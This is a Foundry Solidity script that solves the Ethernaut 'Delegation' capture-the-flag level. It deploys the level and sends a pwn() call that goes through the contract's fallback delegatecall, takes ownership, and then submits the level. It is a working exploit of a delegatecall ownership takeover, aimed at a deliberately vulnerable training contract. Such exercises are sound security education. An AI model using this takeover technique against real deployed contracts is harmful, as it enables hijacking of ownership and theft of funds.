pragma solidity ^0.8.10;

import {Script, console2} from "forge-std/Script.sol";
import "../src/Delegation/DelegationFactory.sol";
import "../src/Delegation/Delegation.sol";

import "../src/Ethernaut.sol";

contract DelegationScript is Script {
    Ethernaut ethernaut;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        ethernaut = new Ethernaut();
        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation ethernautDelegation = Delegation(payable(levelAddress));

        (bool success, bytes memory returndata) = levelAddress.call(abi.encodeWithSignature("pwn()"));

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        assert(levelSuccessfullyPassed);
        vm.stopBroadcast();
    }
}
